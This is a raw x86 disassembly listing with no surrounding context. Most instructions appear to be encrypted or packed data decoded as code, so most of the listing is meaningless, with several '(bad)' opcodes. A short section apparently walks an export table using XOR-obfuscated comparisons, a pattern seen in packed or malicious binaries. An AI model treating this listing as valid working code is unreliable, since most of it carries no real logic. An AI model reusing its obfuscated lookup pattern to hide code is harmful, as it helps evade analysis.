  41a781:	test   BYTE PTR [eax],dh
  41a783:	adc    DWORD PTR [edx-0x73],ebx
  41a786:	cmp    bl,BYTE PTR [ecx-0xae95767]
  41a78c:	mov    ch,0x96
  41a78e:	jb     0x41a781
  41a790:	adc    al,0xa6
  41a792:	jl     0x41a746
  41a794:	test   eax,0xa87f20ef
  41a799:	fcomp  DWORD PTR [esi]
  41a79b:	hlt    
  41a79c:	rcl    DWORD PTR ds:0x8011a99c,0x43
  41a7a3:	stc    
  41a7a4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a7a5:	(bad)  
  41a7a6:	std    
  41a7a7:	loop   0x41a777
  41a7a9:	rol    BYTE PTR [ebp+0x44ada345],1
  41a7af:	mov    edx,0x6fdacb1a
  41a7b4:	sub    DWORD PTR [esi+0x45c66c2f],0xffffffff
  41a7bb:	in     eax,dx
  41a7bc:	imul   ecx,DWORD PTR [ebx],0xffffff8d
  41a7bf:	cwde   
  41a7c0:	lods   al,BYTE PTR ds:[esi]
  41a7c1:	jg     0x41a7f4
  41a7c3:	jno    0x41a786
  41a7c5:	pop    ebx
  41a7c6:	shl    BYTE PTR [ebx+ebp*2-0x66],0x8b
  41a7cb:	xor    BYTE PTR [ebp+0x48],dl
  41a7ce:	mov    eax,ds:0xeadd826c
  41a7d3:	scas   al,BYTE PTR es:[edi]
  41a7d4:	in     al,0x4
  41a7d6:	ss int3 
  41a7d8:	loopne 0x41a82b
  41a7da:	lock fistp WORD PTR [ebp+0x4a]
  41a7de:	pop    es
  41a7df:	cld    
  41a7e0:	cwde   
  41a7e1:	sbb    eax,0xe0adc3cb
  41a7e6:	leave  
  41a7e7:	neg    DWORD PTR [ecx-0x5d]
  41a7ea:	loop   0x41a85d
  41a7ec:	(bad)  
  41a7ed:	faddp  st(7),st
  41a7ef:	lahf   
  41a7f0:	(bad)  
  41a7f1:	jmp    0x41a85b
  41a7f3:	loope  0x41a815
  41a7f5:	int    0xf7
  41a7f7:	push   ss
  41a7f8:	push   0xffffff9a
  41a7fa:	(bad)  
  41a7fb:	xor    eax,edx
  41a7fd:	cdq    
  41a7fe:	or     esp,DWORD PTR [edi+0x3c]
  41a801:	push   ss
  41a802:	inc    eax
  41a803:	xor    al,0x8
  41a805:	mov    ch,BYTE PTR [eax-0x4a04ac23]
  41a80b:	sbb    al,0x79
  41a80d:	push   esp
  41a80e:	push   ebp
  41a80f:	adc    al,0x53
  41a811:	jnp    0x41a7a8
  41a813:	sub    DWORD PTR [ebx+0x9],0xbf5de78e
  41a81a:	clc    
  41a81b:	je     0x41a7ec
  41a81d:	mov    bl,0xc5
  41a81f:	push   ds
  41a820:	ret    
  41a821:	inc    esi
  41a822:	imul   esi,DWORD PTR [edx-0x2234634],0x46
  41a829:	push   ds
  41a82a:	push   ds
  41a82b:	fidivr WORD PTR [esi]
  41a82d:	xchg   edx,eax
  41a82e:	mov    ecx,0x295715e8
  41a833:	or     BYTE PTR [edi+0x59],dh
  41a836:	stos   DWORD PTR es:[edi],eax
  41a837:	ror    BYTE PTR [ecx+0xce4cafa],1
  41a83d:	ja     0x41a885
  41a83f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a840:	ins    DWORD PTR es:[edi],dx
  41a841:	mov    BYTE PTR [eax-0x78ba85ff],bh
  41a847:	cmp    DWORD PTR [eax+0x72],esi
  41a84a:	pop    edx
  41a84b:	scas   eax,DWORD PTR es:[edi]
  41a84c:	test   BYTE PTR [edx+edx*1+0x77],0xff
  41a851:	test   BYTE PTR [edx-0x60],dl
  41a854:	mov    WORD PTR [edx],fs
  41a856:	loopne 0x41a7ec
  41a858:	fimul  WORD PTR [ebp-0x1a4fe1d7]
  41a85e:	div    esi
  41a860:	cwde   
  41a861:	out    dx,al
  41a862:	xchg   ecx,eax
  41a863:	push   es
  41a864:	adc    dh,BYTE PTR [ecx+0x7e]
  41a867:	mov    eax,ds:0x208af18c
  41a86c:	not    DWORD PTR [ebp+0x5a]
  41a86f:	or     al,0x97
  41a871:	adc    esp,DWORD PTR ds:0xe54d627a
  41a877:	mov    cl,0x46
  41a879:	mov    eax,0x20bf2134
  41a87e:	sahf   
  41a87f:	(bad)  
  41a880:	xor    BYTE PTR [ebx],0xf9
  41a883:	test   dh,0x4
  41a886:	pop    esi
  41a887:	scas   eax,DWORD PTR es:[edi]
  41a888:	push   0xffffffa7
  41a88a:	leave  
  41a88b:	sbb    ch,dl
  41a88d:	mov    eax,ds:0x572b4710
  41a892:	push   edx
  41a893:	cdq    
  41a894:	cdq    
  41a895:	and    eax,0x92e0a51c
  41a89a:	mov    ch,0xdf
  41a89c:	mov    ds:0xde829d00,eax
  41a8a1:	and    al,bh
  41a8a3:	data16 sti 
  41a8a5:	cmp    eax,0x98af1067
  41a8aa:	xchg   esp,eax
  41a8ab:	xchg   edi,eax
  41a8ac:	mov    ebx,0xcd36a902
  41a8b1:	xor    DWORD PTR [ebx],eax
  41a8b3:	ret    
  41a8b4:	jmp    0x41c8fd
  41a8b9:	mov    eax,DWORD PTR [ebp-0x2c]
  41a8bc:	movzx  eax,WORD PTR [eax+edi*2]
  41a8c0:	mov    ecx,DWORD PTR [ebp-0x14]
  41a8c3:	mov    eax,DWORD PTR [ecx+eax*4]
  41a8c6:	mov    DWORD PTR [ebp+0xc],eax
  41a8c9:	mov    eax,DWORD PTR [ebp-0x4]
  41a8cc:	mov    ecx,DWORD PTR [ebp-0x8]
  41a8cf:	xor    eax,0x7510850
  41a8d4:	add    eax,ebx
  41a8d6:	cmp    ecx,eax
  41a8d8:	jne    0x41a8eb
  41a8de:	mov    eax,DWORD PTR [ebp-0x4]
  41a8e1:	xor    eax,0x7510850
  41a8e6:	jmp    0x41a8b2
  41a8eb:	mov    eax,DWORD PTR [ebp+0xc]
  41a8ee:	add    eax,DWORD PTR [ebp+0x8]
  41a8f1:	mov    DWORD PTR [ebp-0x10],eax
  41a8f4:	mov    eax,DWORD PTR [ebp-0x1c]
  41a8f7:	test   eax,eax
  41a8f9:	je     0x41bfdb
  41a8ff:	mov    DWORD PTR [ebp-0x24],esi
  41a902:	push   0xb
  41a904:	jmp    0x41ab39
  41a909:	rcl    dh,1
  41a90b:	xlat   BYTE PTR ds:[ebx]
  41a90c:	int3   
  41a90d:	aad    0xd1
  41a90f:	fcmovnu st,st(2)
  41a911:	ss (bad) 
  41a913:	inc    esp
  41a914:	sbb    DWORD PTR [esi],0xffffff8d
  41a917:	mov    dl,0x77
  41a919:	dec    eax
  41a91a:	aad    0x7f
  41a91c:	js     0x41a92e
  41a91e:	jle    0x41a998
  41a920:	js     0x41a997
  41a922:	adc    bl,BYTE PTR [esi-0x2d]
  41a925:	mov    dl,0x35
  41a927:	fucomip st,st(1)
  41a929:	mov    ds:0xc4c82b75,eax
  41a92e:	jmp    0x832a:0xb0bfc8ec
  41a935:	mov    edi,0x5eda5d40
  41a93a:	sub    DWORD PTR [ecx+0x6d6dbd44],ebx
  41a940:	nop
  41a941:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  41a943:	bound  ebx,QWORD PTR [ebx+0x4]
  41a946:	outs   dx,DWORD PTR ds:[esi]
  41a947:	stc    
  41a948:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a949:	(bad)  
  41a94a:	pxor   mm3,QWORD PTR [edi+0x675763af]
  41a951:	icebp  
  41a952:	jb     0x41a904
  41a954:	add    esp,ebx
  41a956:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a957:	popa   
  41a958:	jae    0x41a90e
  41a95a:	aaa    
  41a95b:	dec    edx
  41a95c:	cs jp  0x41a96e
  41a95f:	inc    ebx
  41a960:	retf   
  41a961:	push   esi
  41a962:	dec    edi
  41a963:	dec    edi
  41a964:	dec    esi
  41a965:	inc    ebp
  41a966:	loope  0x41a943
  41a968:	push   0xffffffd0
  41a96a:	mov    ax,ds:0xab8054bb
  41a970:	pop    ss
  41a971:	fwait
  41a972:	xor    esp,ebx
  41a974:	jmp    0x3819:0x1d5cf7af
  41a97b:	mov    ?,WORD PTR [edi+0x79e1d1e4]
  41a981:	bswap  edx
  41a983:	fadd   DWORD PTR [edi-0x26]
  41a986:	int    0x6b
  41a988:	jae    0x41a90c
  41a98a:	daa    
  41a98b:	fidivr DWORD PTR [edi+eax*8-0x7e]
  41a98f:	mov    ecx,0xcc672e0c
  41a994:	pop    ds
  41a995:	xchg   ebx,eax
  41a996:	xor    edi,DWORD PTR [ebp+0x1b8cae37]
  41a99c:	inc    esp
  41a99d:	dec    edx
  41a99e:	mov    bl,0xb5
  41a9a0:	push   ecx
  41a9a1:	adc    ah,ch
  41a9a3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a9a4:	jbe    0x41a96c
  41a9a6:	mov    ebx,0x2951e3d8
  41a9ab:	and    ebx,DWORD PTR [edx-0x6d]
  41a9ae:	mov    WORD PTR [ecx],ds
  41a9b0:	aaa    
  41a9b1:	sbb    al,0xb1
  41a9b3:	sar    BYTE PTR [eax+0x4e],0xb5
  41a9b7:	mov    ds,edx
  41a9b9:	sub    edx,DWORD PTR [ebp+0x42fd3c09]
  41a9bf:	sub    BYTE PTR [esp+edi*2-0x3b66047b],cl
  41a9c6:	inc    ebp
  41a9c7:	jae    0x41a949
  41a9c9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a9ca:	inc    esp
  41a9cb:	pop    ds
  41a9cc:	xchg   edi,eax
  41a9cd:	mov    DWORD PTR [eax-0x59c8145c],ebx
  41a9d3:	mov    al,ds:0xf2dba9f7
  41a9d8:	add    eax,DWORD PTR ds:0x1626452d
  41a9de:	mov    edi,0xcbb7af45
  41a9e3:	mov    ebp,DWORD PTR [esp+ecx*8-0x40]
  41a9e7:	push   es
  41a9e8:	dec    esi
  41a9e9:	cmp    eax,edx
  41a9eb:	sub    cl,BYTE PTR [edi]
  41a9ed:	ja     0x41aa3f
  41a9ef:	inc    ecx
  41a9f0:	test   eax,0xbff22e58
  41a9f5:	fisub  WORD PTR [ebp-0x58]
  41a9f8:	cli    
  41a9f9:	xchg   ecx,eax
  41a9fa:	mov    dh,0xb
  41a9fc:	in     al,dx
  41a9fd:	mov    fs,ebx
  41a9ff:	outs   dx,BYTE PTR ds:[esi]
  41aa00:	scas   al,BYTE PTR es:[edi]
  41aa01:	sbb    ah,BYTE PTR es:[ebp+0x3b]
  41aa05:	dec    ebp
  41aa06:	cld    
  41aa07:	retf   
  41aa08:	ins    DWORD PTR es:[edi],dx
  41aa09:	inc    edx
  41aa0a:	adc    al,0x22
  41aa0c:	mov    cs,WORD PTR [edi]
  41aa0e:	pop    ebx
  41aa0f:	and    bl,BYTE PTR [edi+0x5a0fec36]
  41aa15:	das    
  41aa16:	push   esp
  41aa17:	xor    ax,0x8f79
  41aa1b:	xor    DWORD PTR [ecx-0xa],0x29
  41aa1f:	dec    esi
  41aa20:	adc    al,0xbe
  41aa22:	pop    edx
  41aa23:	mov    al,0xca
  41aa25:	scas   al,BYTE PTR es:[edi]
  41aa26:	es mov ebx,0x77ade15f
  41aa2c:	push   esi
  41aa2d:	xor    al,0x9e
  41aa2f:	sub    ebx,eax
  41aa31:	pop    ebp
  41aa32:	xor    BYTE PTR [ebx],ah
  41aa34:	ins    DWORD PTR es:[edi],dx
  41aa35:	pmovmskb ebp,mm5
  41aa38:	cld    
  41aa39:	jnp    0x41aa09
  41aa3b:	pop    ds
  41aa3c:	fs jno 0x41aa1a
  41aa3f:	inc    esp
  41aa40:	call   0xdb3d09b1
  41aa45:	or     DWORD PTR [esi],ebx
  41aa47:	mov    dl,0xf0
  41aa49:	push   ecx
  41aa4a:	cmp    dh,BYTE PTR [ebx+0x4945b651]
  41aa50:	scas   al,BYTE PTR es:[edi]
  41aa51:	push   ebx
  41aa52:	retf   0x9b9d
  41aa55:	fs and al,0x8
  41aa58:	or     bl,BYTE PTR [eax-0x6c]
  41aa5b:	scas   al,BYTE PTR es:[edi]
  41aa5c:	xchg   edx,eax
  41aa5d:	jmp    0x2a227f4a
  41aa62:	mov    DWORD PTR [esi+edi*8+0x65],esi
  41aa66:	lock pushf 
  41aa68:	mov    edx,0xe02403f3
  41aa6d:	mov    edx,0x87313bad
  41aa72:	data16 xchg BYTE PTR [eax-0x56812305],al
  41aa79:	fs cdq 
  41aa7b:	lea    edi,[ecx]
  41aa7d:	sbb    DWORD PTR [edx+0x692243d2],edi
  41aa83:	ret    0x8b21
  41aa86:	jge    0x41aa94
  41aa88:	and    al,0x52
  41aa8a:	sbb    BYTE PTR [ecx],al
  41aa8c:	jns    0x41aa91
  41aa8e:	sbb    DWORD PTR [esi+0x77e02b48],ebp
  41aa94:	sahf   
  41aa95:	hlt    
  41aa96:	xor    eax,0xd5679409
  41aa9b:	adc    bh,dh
  41aa9d:	lods   al,BYTE PTR ds:[esi]
  41aa9e:	add    esi,eax
  41aaa0:	shl    BYTE PTR [eax+0x31],cl
  41aaa3:	fcom   DWORD PTR [esi+0x1a]
  41aaa6:	xchg   ebp,eax
  41aaa7:	push   esp
  41aaa8:	es dec ebp
  41aaaa:	pushf  
  41aaab:	push   ebx
  41aaac:	mov    dh,BYTE PTR [esi]
  41aaae:	xor    al,0xe4
  41aab1:	jmp    0x41ab0c
  41aab3:	aaa    
  41aab4:	sub    eax,0x83d05db6
  41aab9:	mov    ds:0x3cad9b00,al
  41aabe:	stc    
  41aabf:	sbb    dl,BYTE PTR [ebp-0x44]
  41aac2:	fiadd  DWORD PTR ds:0x62ec9fef
  41aac8:	inc    edi
  41aac9:	sar    DWORD PTR [ebx],cl
  41aacb:	bound  ecx,QWORD PTR [ebx+0x50]
  41aace:	xchg   edx,eax
  41aacf:	stos   DWORD PTR es:[edi],eax
  41aad0:	aad    0xd
  41aad2:	adc    al,0x3d
  41aad4:	pusha  
  41aad5:	fs xor eax,0x7fd09af0
  41aadb:	ficom  DWORD PTR [edi-0x43]
  41aade:	pop    eax
  41aadf:	or     DWORD PTR [eax-0x50],edi
  41aae2:	nop
  41aae3:	mov    cl,0x53
  41aae5:	loope  0x41ab37
  41aae7:	into   
  41aae8:	out    0x75,al
  41aaea:	pop    esp
  41aaeb:	adc    DWORD PTR [ecx+0x3c432ceb],ebx
  41aaf1:	xchg   edi,eax
  41aaf2:	(bad)  
  41aaf3:	mov    eax,0xd6b81a37
  41aaf8:	in     eax,dx
  41aaf9:	adc    DWORD PTR [ebp+ecx*8-0x1f],0x9ab4b1ff
  41ab01:	jae    0x41ab02
  41ab03:	int    0xd5
  41ab05:	leave  
  41ab06:	cld    
  41ab07:	lea    ebp,[edx+0x32b5dc77]
  41ab0d:	das    
  41ab0e:	dec    esi
  41ab0f:	xor    BYTE PTR [edi-0x7b6ed33e],ch
  41ab15:	jo     0x41ab09
  41ab17:	sub    DWORD PTR [edx+0x4ff803b4],esp
  41ab1d:	stos   BYTE PTR es:[edi],al
  41ab1e:	lock add ch,BYTE PTR [eax]
  41ab21:	sub    ecx,DWORD PTR [ecx-0x1babd281]
  41ab27:	and    al,0xb
  41ab29:	mov    esi,0xf98aa988
  41ab2e:	jno    0x41ab9f
  41ab30:	fisub  DWORD PTR [edi-0x2d]
  41ab33:	aad    0xc5
  41ab35:	outs   dx,BYTE PTR ds:[esi]
  41ab36:	and    al,0x35
  41ab38:	or     al,0x59
  41ab3a:	push   0x5
  41ab3c:	dec    ecx
  41ab3d:	pop    ebx
  41ab3e:	jmp    0x41ad73
  41ab43:	rcl    bl,cl
  41ab45:	aas    
  41ab46:	leave  
  41ab47:	cmp    eax,0x48dbdad9
  41ab4c:	pushf  
  41ab4d:	mov    eax,ds:0xbcf67be
  41ab52:	pusha  
  41ab53:	pusha  
  41ab54:	fstp   TBYTE PTR [edi+0x78]
  41ab57:	adc    BYTE PTR [esi+0x78],bh
  41ab5a:	js     0x41ab26
  41ab5c:	jne    0x41ab2a
  41ab5e:	sub    DWORD PTR [ecx+0x231e8648],eax
  41ab64:	jnp    0x41ab0e
  41ab66:	mov    edx,0xed2bf6c1
  41ab6b:	adc    al,BYTE PTR [ebp-0x5b37636d]
  41ab71:	sti    
  41ab72:	fsub   DWORD PTR [eax+eiz*1-0x5787b2af]
  41ab79:	sub    BYTE PTR [eax+0x28388769],dl
  41ab7f:	out    dx,eax
  41ab80:	adc    BYTE PTR [esi+0x2c],bl
  41ab83:	lds    edi,FWORD PTR [esp+edx*1+0xc9a434e]
  41ab8a:	dec    esp
  41ab8b:	ins    BYTE PTR es:[edi],dx
  41ab8c:	mov    edi,0x9d74bad0
  41ab91:	int3   
  41ab92:	nop
  41ab93:	mov    ebp,0xb8e1333d
  41ab98:	jecxz  0x41ab3a
  41ab9a:	stc    
  41ab9b:	js     0x41ab9f
  41ab9d:	jge    0x41abdc
  41ab9f:	jne    0x41ab2b
  41aba1:	fsubp  st(3),st
  41aba3:	fs mov ch,0x31
  41aba6:	mov    BYTE PTR [eax-0x70fc7599],bh
  41abac:	retf   0x4dc3
  41abaf:	xchg   edi,eax
  41abb0:	mov    ds:0x1ff9cd20,al
  41abb5:	dec    esi
  41abb6:	test   DWORD PTR [ebp+0x530ccb67],edx
  41abbc:	sub    al,0x7c
  41abbe:	mov    edx,0x98688259
  41abc3:	add    DWORD PTR [esi-0x504f2ecb],eax
  41abc9:	test   al,0xcc
  41abcb:	bound  esi,QWORD PTR [eax+0x52]
  41abce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41abcf:	mov    cl,BYTE PTR ds:0x103a4da2
  41abd5:	adc    edi,DWORD PTR [ebx+0x0]
  41abd8:	icebp  
  41abd9:	cmp    eax,0xc71b6842
  41abde:	out    0x6e,al
  41abe0:	loop   0x41ab81
  41abe2:	cmp    edi,ebx
  41abe4:	shl    DWORD PTR [eax+ecx*1-0x44],0x25
  41abe9:	xchg   esp,eax
  41abea:	add    eax,DWORD PTR [eax]
  41abec:	lock scas al,BYTE PTR es:[edi]
  41abee:	rol    DWORD PTR [edi-0x51],cl
  41abf1:	pop    eax
  41abf2:	mov    edi,0x63c9ab09
  41abf7:	inc    ebp
  41abf8:	sub    edx,esi
  41abfa:	pop    edi
  41abfb:	aaa    
  41abfc:	inc    ebx
  41abfd:	adc    al,0x1f
  41abff:	mov    BYTE PTR [edx+0x43],al
  41ac02:	shl    DWORD PTR [ecx-0x54],1
  41ac05:	add    edi,esp
  41ac07:	mov    bl,0x44
  41ac09:	push   0xffffffa3
  41ac0b:	ins    BYTE PTR es:[edi],dx
  41ac0c:	cmp    DWORD PTR [edi+0x6ee67b0b],0xffffffc5
  41ac13:	retf   0xbc16
  41ac16:	or     al,0xde
  41ac18:	sbb    cl,BYTE PTR [edi]
  41ac1a:	inc    ecx
  41ac1b:	pusha  
  41ac1c:	aas    
  41ac1d:	and    al,0x2c
  41ac1f:	retf   
  41ac20:	neg    DWORD PTR [ecx-0x6f]
  41ac23:	or     DWORD PTR [eax-0x33976823],esp
  41ac29:	inc    ecx
  41ac2a:	enter  0xbb1e,0x60
  41ac2e:	test   DWORD PTR [edx+0x66],esi
  41ac31:	cmc    
  41ac32:	pop    ebp
  41ac33:	idiv   esp
  41ac35:	arpl   WORD PTR [edi+eax*1],dx
  41ac38:	add    DWORD PTR [eax+0x1597fb81],esp
  41ac3e:	add    ah,BYTE PTR [ebp-0x6ac35034]
  41ac44:	dec    esp
  41ac45:	jne    0x41abc7
  41ac47:	adc    edi,DWORD PTR ds:0x503d2e30
  41ac4d:	data16 js 0x41abef
  41ac50:	js     0x41acb8
  41ac52:	sbb    dl,BYTE PTR [ecx+0x732b497a]
  41ac58:	sahf   
  41ac59:	and    cl,BYTE PTR [edx]
  41ac5b:	sti    
  41ac5c:	aad    0xcc
  41ac5e:	jae    0x41ac8d
  41ac60:	xchg   BYTE PTR ds:0x7e60f0bf,bh
  41ac66:	mov    edi,ecx
  41ac68:	repnz sbb BYTE PTR [ecx-0x5b],dl
  41ac6c:	inc    edx
  41ac6d:	(bad)  
  41ac6e:	enter  0x3188,0x8d
  41ac72:	inc    ecx
  41ac73:	sub    BYTE PTR [eax-0x196202ee],dl
  41ac79:	inc    ebp
  41ac7a:	(bad)  
  41ac7c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ac7d:	sub    BYTE PTR [ecx],bl
  41ac7f:	adc    ah,BYTE PTR [ebx-0x46]
  41ac82:	cmp    al,BYTE PTR [esi-0x1b491760]
  41ac88:	ss cmp edx,edx
  41ac8b:	iret   
  41ac8c:	sbb    DWORD PTR [edi+0x1574121d],0x55
  41ac93:	cmp    DWORD PTR [esi+0x4b28fad1],ebx
  41ac99:	jle    0x41ac89
  41ac9b:	retf   0x483c
  41ac9e:	or     eax,0x7a7bce2f
  41aca3:	or     eax,0x386e1340
  41aca8:	cmp    dl,dh
  41acaa:	xchg   edx,eax
  41acab:	xor    eax,0xa00fbfc6
  41acb0:	(bad)  
  41acb1:	xor    edi,edi
  41acb3:	push   ds
  41acb4:	push   ecx
  41acb5:	mov    esp,0xf31e730a
  41acba:	test   eax,0x2a66b063
  41acbf:	and    al,0x3d
  41acc1:	fisub  DWORD PTR [ebp+0x5a]
  41acc4:	cli    
  41acc5:	fwait
  41acc6:	mov    ds:0x61505fe0,al
  41accb:	sbb    bh,ah
  41accd:	and    DWORD PTR [ebp+0x21],esp
  41acd0:	mov    ah,0x99
  41acd2:	jecxz  0x41ad17
  41acd4:	enter  0xdd79,0x2d
  41acd8:	sbb    DWORD PTR [edx-0x347fcc91],eax
  41acde:	push   0x599ab3b2
  41ace3:	xor    BYTE PTR [edi-0x19],ch
  41ace6:	(bad)
  41aceb:	adc    BYTE PTR [ebx+ecx*1],bl
  41acee:	push   esi
  41acef:	iret   
  41acf0:	pop    edi
  41acf1:	and    cl,bl
  41acf3:	fisttp WORD PTR [edx+0x1068e286]
  41acf9:	call   0xa364:0xd1eb4ee2
  41ad00:	mov    ebp,0xba2a34dc
  41ad05:	arpl   WORD PTR [esi+0x13c9da40],cx
  41ad0b:	sub    bl,0x5b
  41ad0e:	push   ds
  41ad0f:	inc    eax
  41ad10:	mov    esi,eax
  41ad12:	pop    ecx
  41ad13:	cmp    eax,0x66848d63
  41ad18:	sbb    eax,0x29682755
  41ad1d:	sbb    BYTE PTR [edx],0xe7
  41ad20:	push   0xbad59909
  41ad25:	in     eax,dx
  41ad26:	int    0x76
  41ad28:	dec    edi
  41ad29:	mov    bl,0x93
  41ad2b:	mov    WORD PTR [esi+edi*4-0x7],fs
  41ad2f:	jno    0x41ad44
  41ad31:	pop    edi
  41ad32:	imul   eax,ebx,0xa
  41ad35:	jae    0x41ace7
  41ad37:	loope  0x41ad54
  41ad39:	jge    0x41ad7b
  41ad3b:	repz sbb esp,esi
  41ad3e:	mov    eax,ds:0x60039273
  41ad43:	xor    al,BYTE PTR [ebp-0x2]
  41ad46:	and    ch,BYTE PTR [eax]
  41ad48:	dec    eax
  41ad49:	aas    
  41ad4a:	loop   0x41ad4d
  41ad4c:	cwde   
  41ad4d:	inc    edx
  41ad4e:	dec    esp
  41ad4f:	sahf   
  41ad50:	adc    eax,0xccee6cd4
  41ad55:	jnp    0x41acf8
  41ad57:	fisttp QWORD PTR [edi-0x21]
  41ad5a:	fild   QWORD PTR [ebx]
  41ad5c:	ds mov edi,0x91e8eb78
  41ad62:	sbb    esi,DWORD PTR [esi-0x662aece6]
  41ad68:	int3   
  41ad69:	or     cl,BYTE PTR [esi-0x8d1bfc8]
  41ad6f:	and    al,0x13
  41ad71:	mov    ch,0x22
  41ad73:	xchg   ebx,ecx
  41ad75:	sub    ebx,ecx
  41ad77:	jmp    0x41afac
  41ad7c:	ret    0xd1d7
  41ad7f:	aas    
  41ad80:	fxch   st(1)
  41ad82:	rcr    cl,cl
  41ad84:	mov    ds:0xfd25295,eax
  41ad89:	sub    edx,DWORD PTR [esi+0x7fd878ef]
  41ad8f:	js     0x41ada1
  41ad91:	jle    0x41ae0b
  41ad93:	js     0x41ad6a
  41ad95:	mov    ecx,0x6105dc14
  41ad9a:	add    edi,DWORD PTR [ebp+0x7f6694f1]
  41ada0:	imul   esp,DWORD PTR [ebx],0xece2202f
  41ada6:	mov    DWORD PTR [edi+0x7d],ebp
  41ada9:	push   ss
  41adaa:	mov    esi,edx
  41adac:	sar    BYTE PTR [edi+0x27],1
  41adaf:	fstp   QWORD PTR [eax+ebp*8]
  41adb2:	adc    bl,bh
  41adb4:	xor    al,0x3a
  41adb6:	out    0x71,eax
  41adb8:	lock sbb BYTE PTR [ebx+0x5d639333],al
  41adbf:	fstp   TBYTE PTR [eax-0x23]
  41adc2:	sub    dl,BYTE PTR [edx+ebp*2+0x1cb5456e]
  41adc9:	shl    cl,cl
  41adcb:	add    esp,esi
  41adcd:	jns    0x41ad60
  41adcf:	cld    
  41add0:	pmaddwd mm0,QWORD PTR [edx]
  41add3:	push   esi
  41add4:	pop    ds
  41add5:	add    dh,BYTE PTR [edx+0x49261349]
  41addb:	outs   dx,BYTE PTR ds:[esi]
  41addc:	push   0xfbd00751
  41ade1:	mov    bh,0xdf
  41ade3:	js     0x41ad8b
  41ade5:	or     BYTE PTR [edi+0x20],bl
  41ade8:	loop   0x41ae1c
  41adea:	cdq    
  41adeb:	mov    al,ds:0xf8c1f0b0
  41adf0:	sub    ah,BYTE PTR fs:[ebp-0x29]
  41adf4:	stc    
  41adf5:	int    0xf4
  41adf7:	sbb    edi,edx
  41adf9:	mov    eax,0x8b3ab287
  41adfe:	sub    bh,BYTE PTR [edx-0x6d5a1beb]
  41ae04:	cmc    
  41ae05:	fld    TBYTE PTR [esi+ecx*1]
  41ae08:	popa   
  41ae09:	ret    0xd1a9
  41ae0c:	(bad)  
  41ae0d:	adc    eax,0x98acdc0
  41ae12:	mov    dh,bl
  41ae14:	sbb    edi,DWORD PTR [ecx-0x50]
  41ae17:	scas   eax,DWORD PTR es:[edi]
  41ae18:	ret    
  41ae19:	arpl   sp,cx
  41ae1b:	sub    ch,bh
  41ae1d:	jle    0x41adc8
  41ae1f:	push   ebp
  41ae20:	shl    BYTE PTR [ebx+esi*1],1
  41ae23:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ae24:	mov    eax,ds:0x6deb45d3
  41ae29:	jg     0x41ae8c
  41ae2b:	mov    esi,0x4be49929
  41ae30:	call   0x963d:0x86e1ce98
  41ae37:	jmp    0x3d50:0xce948aa2
  41ae3e:	loope  0x41ae35
  41ae40:	mov    edx,0xeeb529dc
  41ae45:	idiv   DWORD PTR [edi]
  41ae47:	adc    ecx,DWORD PTR [edi+0x50]
  41ae4a:	rcl    DWORD PTR [esi+esi*4-0x3d511426],1
  41ae51:	js     0x41ae57
  41ae53:	pusha  
  41ae54:	pop    ss
  41ae55:	jne    0x41ae5a
  41ae57:	fidiv  WORD PTR [edi]
  41ae59:	add    ecx,ebx
  41ae5b:	mov    eax,0xa6988bf8
  41ae60:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ae61:	jge    0x41ae43
  41ae63:	and    edi,esi
  41ae65:	loop   0x41ade8
  41ae67:	add    BYTE PTR [ebx],dl
  41ae69:	pushf  
  41ae6a:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  41ae6c:	lds    ebx,FWORD PTR [ebp+eax*2+0x70]
  41ae70:	retf   
  41ae71:	scas   eax,DWORD PTR es:[edi]
  41ae72:	add    DWORD PTR [ecx+0x77],ebp
  41ae75:	hlt    
  41ae76:	mov    ds:0xb72d0212,al
  41ae7b:	arpl   WORD PTR [edx-0x74],bx
  41ae7e:	test   DWORD PTR [edi+ebx*4],eax
  41ae81:	shl    BYTE PTR [ebx-0xe997a86],0xa4
  41ae88:	rcl    BYTE PTR [esi+0x27caf546],1
  41ae8e:	ins    DWORD PTR es:[edi],dx
  41ae8f:	pop    eax
  41ae90:	adc    eax,0x4fffd2de
  41ae95:	ins    BYTE PTR es:[edi],dx
  41ae96:	pop    edx
  41ae97:	ret    0x67f9
  41ae9a:	mov    dh,0x98
  41ae9c:	jmp    0x41ae98
  41ae9e:	mov    edi,0xd7b4006b
  41aea3:	test   BYTE PTR [esi],ch
  41aea5:	in     al,dx
  41aea6:	loope  0x41aeca
  41aea8:	lock dec ecx
  41aeaa:	sub    bl,0x67
  41aead:	push   edx
  41aeae:	sbb    al,0xf5
  41aeb0:	push   0x5dca67cd
  41aeb5:	jae    0x41ae9c
  41aeb7:	int3   
  41aeb8:	stos   BYTE PTR es:[edi],al
  41aeb9:	pop    edx
  41aeba:	pop    edi
  41aebb:	daa    
  41aebc:	xlat   BYTE PTR ds:[ebx]
  41aebd:	dec    esp
  41aebe:	pop    ecx
  41aebf:	xchg   BYTE PTR [eax+ebx*1+0x1a],cl
  41aec3:	or     BYTE PTR [ebx],cl
  41aec5:	mov    al,0xf3
  41aec7:	test   al,0x51
  41aec9:	push   esi
  41aeca:	int    0xa4
  41aecc:	or     DWORD PTR [ecx-0x2],eax
  41aecf:	xchg   edx,eax
  41aed0:	scas   al,BYTE PTR es:[edi]
  41aed1:	jle    0x41aee3
  41aed3:	adc    esi,0xffffff87
  41aed6:	inc    ebp
  41aed7:	pop    edi
  41aed8:	leave  
  41aed9:	(bad)  
  41aeda:	jbe    0x41ae5d
  41aedc:	ret    0x96d6
  41aedf:	stc    
  41aee0:	adc    al,0x52
  41aee2:	popa   
  41aee3:	aas    
  41aee4:	jmp    0x41af32
  41aee6:	ins    DWORD PTR es:[edi],dx
  41aee7:	add    dh,ah
  41aee9:	fld    DWORD PTR [ebx-0x3]
  41aeec:	mov    al,ds:0x6a9db54b
  41aef1:	inc    ebp
  41aef2:	adc    ecx,ebp
  41aef4:	mov    bl,0xad
  41aef6:	xor    BYTE PTR gs:[eax+0x5a1c5889],dl
